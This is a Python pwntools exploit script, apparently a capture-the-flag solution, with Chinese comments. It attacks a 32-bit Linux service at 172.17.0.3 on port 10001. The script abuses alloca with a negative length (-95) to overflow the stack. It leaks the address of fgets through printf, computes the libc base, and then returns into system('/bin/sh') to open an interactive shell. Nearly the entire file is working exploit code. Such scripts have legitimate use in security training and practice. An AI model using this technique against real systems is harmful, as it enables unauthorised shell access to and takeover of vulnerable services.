#!/usr/bin/python
#coding:utf-8

from pwn import *

context.update(arch = 'i386', os = 'linux', timeout = 1)
io = remote('172.17.0.3', 10001)

printf_plt = 0x08048436
fgets = 0x804a014
main = 0x80485ca

e = ELF("./libc.so.6_x86")		#加载程序使用的libc库

payload = ""
payload += 'A'*48				#padding
payload += p32(printf_plt)		#调用printf打印fgets在内存中的地址
payload += p32(main)			#printf函数执行完后返回到main
payload += p32(fgets)			#fgets函数地址，提供给printf函数

io.recvuntil("Message Length >> ")	
io.sendline("-95")				#alloca函数用于分配栈空间，参数为负数时栈空间收缩，从而在main函数造成栈溢出
io.recvuntil("Name >> ")
io.sendline(payload)
io.recvuntil("Message : ")
io.recvline()

fgets_leak = u32(io.recvn(4))	#获取到fgets函数的内存地址
log.info("fgets_got: {}".format(hex(fgets_leak)))	
libc_start = fgets_leak - e.symbols["fgets"]	#获取libc库在内存中的首地址
log.info("libc: {}".format(hex(libc_start)))
system = libc_start + e.symbols["system"]		#获取system函数的地址
binsh = libc_start + next(e.search("/bin/sh"))	#获取/bin/sh字符串地址

payload = ""
payload += 'A'*48				#padding
payload += p32(system)			#调用system函数执行system("/bin/sh")
payload += p32(0)				#system函数返回的地址，随便填
payload += p32(binsh)			#"/bin/sh"字符串，system的参数

io.recvuntil("Message Length >> ")
io.sendline("-95")				#alloca函数用于分配栈空间，参数为负数时栈空间收缩，从而在main函数造成栈溢出
io.recvuntil("Name >> ")
io.sendline(payload)

io.interactive()
